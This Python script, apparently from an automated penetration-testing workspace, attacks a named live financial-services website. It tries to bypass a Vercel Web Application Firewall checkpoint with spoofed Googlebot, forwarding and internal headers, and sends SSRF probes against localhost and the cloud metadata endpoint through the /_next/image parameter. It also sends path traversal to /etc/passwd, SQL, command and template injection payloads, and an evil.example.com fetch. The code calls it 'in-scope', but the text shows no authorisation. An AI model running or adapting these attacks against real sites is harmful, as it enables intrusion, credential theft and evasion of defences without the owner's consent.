#!/usr/bin/env python3
"""Vercel Security Checkpoint bypass attempts + injection probes (in-scope host only)."""
import json, urllib.request, urllib.parse, ssl, time, sys

BASE = "https://www.infinitycapital.bh"
IMG = "https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg"
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE

def req(url, headers=None, method="GET", data=None, timeout=25):
    h = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome Safari/537.36",
         "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept-Language":"en-US,en;q=0.9"}
    if headers: h.update(headers)
    r = urllib.request.Request(url, headers=h, method=method, data=data)
    try:
        with urllib.request.urlopen(r, context=ctx, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return 0, {}, str(e).encode()

out = []
# --- 1. Header-based WAF bypass attempts ---
bypass_headers = [
  ("sec-fetch headers", {"Sec-Fetch-Dest":"document","Sec-Fetch-Mode":"navigate","Sec-Fetch-Site":"none","Sec-Fetch-User":"?1","Upgrade-Insecure-Requests":"1"}),
  ("googlebot", {"User-Agent":"Googlebot/2.1 (+http://www.google.com/bot.html)"}),
  ("vercel-internal", {"X-Vercel-Id":"1","X-Real-Ip":"1.1.1.1","X-Forwarded-For":"1.1.1.1","X-Forwarded-Proto":"https","CF-Connecting-IP":"1.1.1.1","True-Client-IP":"1.1.1.1"}),
  ("method-override", {"X-HTTP-Method-Override":"GET","X-Method-Override":"GET"}),
  ("accept-json", {"Accept":"application/json"}),
  ("range", {"Range":"bytes=0-1000"}),
  ("xff-chain", {"X-Forwarded-For":"1.1.1.1, 2.2.2.2","X-Originating-IP":"1.1.1.1","X-Client-IP":"1.1.1.1","Client-IP":"1.1.1.1"}),
]
print("=== WAF BYPASS ATTEMPTS ===")
for name, hh in bypass_headers:
    for path in ["/", "/about", "/api/"]:
        c, h, b = req(BASE+path, hh)
        mit = h.get("x-vercel-mitigated","-")
        title = b[:200].decode("utf8","ignore")
        ischal = "Security Checkpoint" in b.decode("utf8","ignore")
        print(f"  {name:20s} {path:10s} -> {c} mit={mit} challenge={ischal} len={len(b)}")
        out.append({"test":"bypass","name":name,"path":path,"code":c,"mitigated":mit,"challenge":ischal,"len":len(b)})
    time.sleep(0.4)

# --- 2. HTTP method / protocol variants ---
print("=== METHOD VARIANTS on / ===")
for m in ["GET","HEAD","POST","OPTIONS","PUT","TRACE","PATCH"]:
    c,h,b = req(BASE+"/", method=m, data=b"" if m in ("POST","PUT","PATCH") else None)
    print(f"  {m:8s} -> {c} mit={h.get('x-vercel-mitigated','-')} len={len(b)}")
    out.append({"test":"method","method":m,"code":c,"mitigated":h.get("x-vercel-mitigated","-")})
    time.sleep(0.3)

# --- 3. Injection probes on the ONLY params the app has (_next/image) ---
print("=== INJECTION PROBES /_next/image ===")
tests = [
  ("ssrf-file", {"url":"http://127.0.0.1:22/"}),
  ("ssrf-169", {"url":"http://169.254.169.254/latest/meta-data/"}),
  ("ssrf-gopher", {"url":"gopher://127.0.0.1:11211/_stats"}),
  ("ssrf-redirect-http", {"url":"http://127.0.0.1/x"}),
  ("path-traversal", {"url":"../../../../etc/passwd"}),
  ("path-traversal2", {"url":"/etc/passwd"}),
  ("nullbyte", {"url":IMG+"\x00.txt"}),
  ("sqli-url", {"url":IMG+"'"}),
  ("sqli-url2", {"url":IMG+"' OR '1'='1"}),
  ("sqli-url3", {"url":IMG+"; SELECT 1--"}),
  ("sqli-url4", {"url":IMG+" AND SLEEP(5)--"}),
  ("cmdi-url", {"url":IMG+";id"}),
  ("cmdi-url2", {"url":IMG+"|id"}),
  ("cmdi-url3", {"url":IMG+"$(id)"}),
  ("ssti-url", {"url":IMG+"{{7*7}}"}),
  ("ssti-url2", {"url":IMG+"${7*7}"}),
  ("w-err", {"w":"abc"}),
  ("w-sqli", {"w":"1 OR 1=1"}),
  ("w-cmd", {"w":"1;id"}),
  ("q-err", {"q":"abc"}),
  ("q-sqli", {"q":"75' OR '1'='1"}),
  ("q-cmd", {"q":"75;id"}),
  ("w-oversize", {"w":"9"*5000}),
  ("url-ext", {"url":"https://evil.example.com/x.png"}),
  ("url-gopher", {"url":"gopher://127.0.0.1:3306/"}),
]
for name, params in tests:
    qs = urllib.parse.urlencode(dict(params, w=1080, q=75)) if "w" not in params else urllib.parse.urlencode(params)
    url = BASE + "/_next/image?" + qs
    t0=time.time()
    c,h,b = req(url)
    dt=time.time()-t0
    body=b.decode("utf8","ignore")
    ischal = "Security Checkpoint" in body
    print(f"  {name:22s} -> {c} mit={h.get('x-vercel-mitigated','-')} chal={ischal} dt={dt:.2f} len={len(b)}")
    out.append({"test":"injection","name":name,"code":c,"mitigated":h.get("x-vercel-mitigated","-"),"challenge":ischal,"dt":dt,"len":len(b)})
    time.sleep(0.3)

json.dump(out, open("tool_outputs/bypass_inject.json","w"), indent=1)
print("\nSaved tool_outputs/bypass_inject.json")
